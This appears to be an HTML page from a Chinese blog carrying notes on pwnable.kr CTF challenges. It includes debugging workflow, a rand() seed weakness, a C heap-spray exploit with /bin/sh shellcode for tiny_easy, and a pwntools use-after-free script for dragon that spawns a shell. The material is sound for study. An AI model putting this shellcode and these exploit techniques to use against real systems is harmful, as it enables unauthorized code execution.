@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('http://juniorprincewang.github.io').hostname,
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.6.0',
+    exturl: false,
+    sidebar: {"position":"left","width":320,"display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    bookmark: {"enable":true,"color":"#222","save":"auto"},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="pwnable.kr算是pwn入门级别的题目，做一遍记录下大概的知识点。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.kr笔记">
+<meta property="og:url" content="http://juniorprincewang.github.io/2017/08/13/pwnable-kr%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="TO DO">
+<meta property="og:description" content="pwnable.kr算是pwn入门级别的题目，做一遍记录下大概的知识点。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2017-08-13T07:23:28.000Z">
+<meta property="article:modified_time" content="2021-03-26T11:25:06.953Z">
+<meta property="article:author" content="Max">
+<meta property="article:tag" content="pwnable.kr">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://juniorprincewang.github.io/2017/08/13/pwnable-kr%E7%AC%94%E8%AE%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>pwnable.kr笔记 | TO DO</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="/custom_css_source.css">
+<!-- hexo injector head_end end --><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">TO DO</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">吾尝终日而思矣，不如须臾之所学也。</p>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/juniorprincewang" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://juniorprincewang.github.io/2017/08/13/pwnable-kr%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Max">
+      <meta itemprop="description" content="文章本天成，妙手偶得之。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="TO DO">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          pwnable.kr笔记
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2017-08-13 15:23:28" itemprop="dateCreated datePublished" datetime="2017-08-13T15:23:28+08:00">2017-08-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-26 19:25:06" itemprop="dateModified" datetime="2021-03-26T19:25:06+08:00">2021-03-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/security/" itemprop="url" rel="index">
+                    <span itemprop="name">security</span>
+                  </a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/security/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index">
+                    <span itemprop="name">ctf</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>pwnable.kr算是pwn入门级别的题目，做一遍记录下大概的知识点。</p>
+<span id="more"></span>
+<h1 id="大致流程"><a href="#大致流程" class="headerlink" title="大致流程"></a>大致流程</h1><ol>
+<li>检查软件的详细信息，得到是32位或64位的ELF。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">checksec software</span><br><span class="line">或</span><br><span class="line">file software</span><br><span class="line">或者</span><br><span class="line">binwalk software</span><br></pre></td></tr></table></figure></li>
+<li>运行软件，了解软件的流程，一般将软件拷贝到本地来调试方便些，可以通过(<code>scp</code>)[<a target="_blank" rel="noopener" href="http://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/scp.html]">http://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/scp.html]</a> 命令。例如将<code>tiny_easy</code>拷贝到本地目录内，输入以下命令，再输入密码即可。</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P 2222  tiny_easy@pwnable.kr:&#x2F;home&#x2F;tiny_easy&#x2F;tiny_easy .</span><br></pre></td></tr></table></figure>
+
+
+<ol start="3">
+<li>使用gdb工具调试软件<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 加载软件，不显示额外信息</span><br><span class="line">gdb -q software</span><br><span class="line"># 加载</span><br></pre></td></tr></table></figure>
+关闭<code>alarm(0x38u);</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ handle SIGALRM print nopass</span><br><span class="line">Signal        Stop  Print   Pass to program Description</span><br><span class="line">SIGALRM       No    Yes No      Alarm clock</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>将代码重新编译成可执行文件，关闭gcc编译器优化以启用缓冲区溢出。</p>
+<ol>
+<li><p>禁用ASLR</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bash -c &#39;echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space&#39;</span><br></pre></td></tr></table></figure></li>
+<li><p>禁用canary：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc overflow.c -o overflow -fno-stack-protector</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="pwntools工具"><a href="#pwntools工具" class="headerlink" title="pwntools工具"></a>pwntools工具</h2><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>通过(pwnlib.shellcraft)[<a target="_blank" rel="noopener" href="http://docs.pwntools.com/en/stable/shellcraft/i386.html#pwnlib.shellcraft.i386.linux.syscall]">http://docs.pwntools.com/en/stable/shellcraft/i386.html#pwnlib.shellcraft.i386.linux.syscall]</a> 调用系统调用来生成<code>shellcode</code>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> pwnlib.shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/home/pwn/flag&#x27;</span>).rstrip()</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Toddler’s-Bottle"><a href="#Toddler’s-Bottle" class="headerlink" title="[Toddler’s Bottle]"></a>[Toddler’s Bottle]</h1><h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><h2 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h2><h2 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h2><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><pre><code>Papa brought me a packed present! let&#39;s open it.
+Download : http://pwnable.kr/bin/flag
+
+This is reversing task. all you need is binary
+</code></pre>
+<p>这道题说的很明确，对软件逆向，而且是个<code>packed</code>软件。</p>
+<p>运行软件</p>
+<h2 id="random"><a href="#random" class="headerlink" title="random"></a>random</h2><p>本题就考察的是对rand函数的理解。随机数生成器需要设置随机种子。如果rand未设置，rand会在调用时自动设置随机数种子为1。rand()产生的是伪随机数，每次执行的结果相同。若要不同，需要调用srand()初始化函数。<br>利用gdb调试，rand()每次确实生成相同的数<code>0x6b8b4567</code>。<br>所以可以利用异或得：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key &#x3D; 0x6b8b4567^0xdeadbeef &#x3D; 3039230856</span><br></pre></td></tr></table></figure>
+
+<h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><h1 id="Rookiss"><a href="#Rookiss" class="headerlink" title="[Rookiss]"></a>[Rookiss]</h1><h2 id="otp"><a href="#otp" class="headerlink" title="otp"></a>otp</h2><h2 id="tiny-easy"><a href="#tiny-easy" class="headerlink" title="tiny_easy"></a>tiny_easy</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<p>程序将所有保护措施关闭，关键代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x8048054:	pop    eax</span><br><span class="line">0x8048055:	pop    edx</span><br><span class="line">0x8048056:	mov    edx,DWORD PTR [edx]</span><br><span class="line">0x8048058:	call   edx</span><br></pre></td></tr></table></figure>
+
+<p>通过<code>strace</code>查看错误发生在哪里。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  tiny_easy strace -if .&#x2F;tiny_easy</span><br><span class="line">[00007ff68ad5c047] execve(&quot;.&#x2F;tiny_easy&quot;, [&quot;.&#x2F;tiny_easy&quot;], [&#x2F;* 66 vars *&#x2F;]) &#x3D; 0</span><br><span class="line">[69742f2e] --- SIGSEGV &#123;si_signo&#x3D;SIGSEGV, si_code&#x3D;SEGV_MAPERR, si_addr&#x3D;0x69742f2e&#125; ---</span><br><span class="line">[????????????????] +++ killed by SIGSEGV +++</span><br><span class="line">[1]    34625 segmentation fault  strace -if .&#x2F;tiny_easy</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>堆喷射，即在 argv[0] 里面放猜测的栈中的某个地址，然后跳到存在 argv[1…n] 里面的 shellcode. 用大量的滑行区来填充shellcode的前部。只要EIP能落在滑行区就可以执行shellcode。只要部署大量的带有滑行区的shellcode，多次尝试，肯定会有EIP落入滑行区的时候。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *shellcode = \</span><br><span class="line">     <span class="string">&quot;\xeb\x16\x5e\x31\xd2\x52\x56\x89\xe1\x89\xf3\x31\xc0\xb0\x0b\xcd&quot;</span></span><br><span class="line">     <span class="string">&quot;\x80\x31\xdb\x31\xc0\x40\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69&quot;</span></span><br><span class="line">     <span class="string">&quot;\x6e\x2f\x73\x68&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> arg[<span class="number">130001</span>];</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="built_in">memset</span>(arg, <span class="string">&#x27;\x90&#x27;</span>, <span class="number">130000</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(arg + <span class="number">130000</span> - <span class="built_in">strlen</span>(shellcode), shellcode);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> == fork())</span><br><span class="line">            execl(<span class="string">&quot;/home/tiny_easy/tiny_easy&quot;</span>, <span class="string">&quot;\xe0\xf0\x7c\xff&quot;</span>,</span><br><span class="line">                    arg, arg, arg, arg, arg, arg, arg, arg,</span><br><span class="line">                    arg, arg, arg, arg, arg, arg, arg, arg,</span><br><span class="line">                    <span class="literal">NULL</span>);</span><br><span class="line">        wait(&amp;status);</span><br><span class="line">        <span class="keyword">if</span> (WIFEXITED(status))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="dragon"><a href="#dragon" class="headerlink" title="dragon"></a>dragon</h2><p>此题需要注意的是dragon结构体的定义。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v5[1] &#x3D; 1;</span><br><span class="line">*((_BYTE *)v5 + 8) &#x3D; 80;</span><br><span class="line">*((_BYTE *)v5 + 9) &#x3D; 4;</span><br><span class="line">v5[3] &#x3D; 10;</span><br><span class="line">*v5 &#x3D; PrintMonsterInfo;</span><br></pre></td></tr></table></figure>
+
+<p>得出的dragon结构体为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">struct dragon&#123;</span><br><span class="line">	char * printDragonInfo;</span><br><span class="line">	int type;</span><br><span class="line">	char HP;</span><br><span class="line">	char regeneration;</span><br><span class="line">	int damage;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而英雄的结构体定义</p>
+<pre><code>*ptr = 1;
+ptr[1] = 42;
+ptr[2] = 50;
+ptr[3] = PrintPlayerInfo;
+</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct hero&#123;</span><br><span class="line">	int type;</span><br><span class="line">	int HP;</span><br><span class="line">	int mp;</span><br><span class="line">	char * printHeroInfo;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>打龙时，胜利的条件是</p>
+<pre><code> 1. *(_DWORD *)(ptrHero + 4) &gt; 0 
+ 2. *((_BYTE *)ptrDragon + 8) &lt;= 0 
+</code></pre>
+<p>通过正常的流程英雄无法胜利，但是我们注意到，dragon的HP是<code>_BYTE_</code>类型，也就是有符号的字符型，可以通过汇编代码查看。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:08048AE6                 movzx   eax, byte ptr [eax+8]</span><br><span class="line">.text:08048AEA                 test    al, al</span><br><span class="line">.text:08048AEC                 jg      short loc_8048B00</span><br></pre></td></tr></table></figure>
+<p><code>jg</code>表示有符号比较。</p>
+<p>龙怪有个回血技能，可以让龙怪的<code>HP</code>增加，所以我们可以利用这一点，让<code>HP</code>超过127后溢出，变成负数。</p>
+<p>这里选择的策略是，<code>mama dragon</code>，<code>priest</code>，3技能龙怪不攻击但是龙怪回血,2技能<code>priest</code>回蓝，组合为<code>332332332</code>。</p>
+<p>还有注意，<code>dragon</code>出现是随机但是交替的，需要判断下。最后利用UAF返回到程序中已经给出的<code>system(&quot;/bin/sh&quot;);</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">debug &#x3D; False</span><br><span class="line">if debug:</span><br><span class="line">    p &#x3D; process(&#39;.&#x2F;dragon&#39;)</span><br><span class="line">    context.log_level&#x3D;&quot;debug&quot;</span><br><span class="line">else:</span><br><span class="line">    p &#x3D; remote(&#39;pwnable.kr&#39;, 9004)</span><br><span class="line"></span><br><span class="line">test&#x3D;&#39;1332332&#39;</span><br><span class="line">commands&#x3D;&#39;1332332332332&#39;</span><br><span class="line">print p.recv()</span><br><span class="line">for c in test:</span><br><span class="line">    p.sendline(c)</span><br><span class="line">s &#x3D; p.recvuntil(&#39;You Have Been Defeated!&#39;)</span><br><span class="line">if s:</span><br><span class="line">    for c in commands:</span><br><span class="line">        p.sendline(c)</span><br><span class="line">        print p.recv()</span><br><span class="line">else:</span><br><span class="line">    for c in (&#39;332332&#39;):</span><br><span class="line">        p.sendline(c)</span><br><span class="line">binsh&#x3D;0x08048DBF</span><br><span class="line"></span><br><span class="line">p.sendline(p32(binsh))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwnable-kr/" rel="tag"># pwnable.kr</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2017/08/13/linux-docs/" rel="prev" title="linux操作">
+      <i class="fa fa-chevron-left"></i> linux操作
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2017/08/13/GDB%E8%B0%83%E8%AF%95/" rel="next" title="GDB调试">
+      GDB调试 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A4%A7%E8%87%B4%E6%B5%81%E7%A8%8B"><span class="nav-number">1.</span> <span class="nav-text">大致流程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pwntools%E5%B7%A5%E5%85%B7"><span class="nav-number">1.1.</span> <span class="nav-text">pwntools工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#shellcode"><span class="nav-number">1.1.1.</span> <span class="nav-text">shellcode</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Toddler%E2%80%99s-Bottle"><span class="nav-number">2.</span> <span class="nav-text">[Toddler’s Bottle]</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#fd"><span class="nav-number">2.1.</span> <span class="nav-text">fd</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#collision"><span class="nav-number">2.2.</span> <span class="nav-text">collision</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bof"><span class="nav-number">2.3.</span> <span class="nav-text">bof</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flag"><span class="nav-number">2.4.</span> <span class="nav-text">flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#random"><span class="nav-number">2.5.</span> <span class="nav-text">random</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unlink"><span class="nav-number">2.6.</span> <span class="nav-text">unlink</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Rookiss"><span class="nav-number">3.</span> <span class="nav-text">[Rookiss]</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#otp"><span class="nav-number">3.1.</span> <span class="nav-text">otp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tiny-easy"><span class="nav-number">3.2.</span> <span class="nav-text">tiny_easy</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">3.2.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98"><span class="nav-number">3.2.2.</span> <span class="nav-text">解题</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dragon"><span class="nav-number">3.3.</span> <span class="nav-text">dragon</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Max"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">Max</p>
+  <div class="site-description" itemprop="description">文章本天成，妙手偶得之。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">86</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">92</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/juniorprincewang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;juniorprincewang" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:maxzywang@163.com" title="E-Mail → mailto:maxzywang@163.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
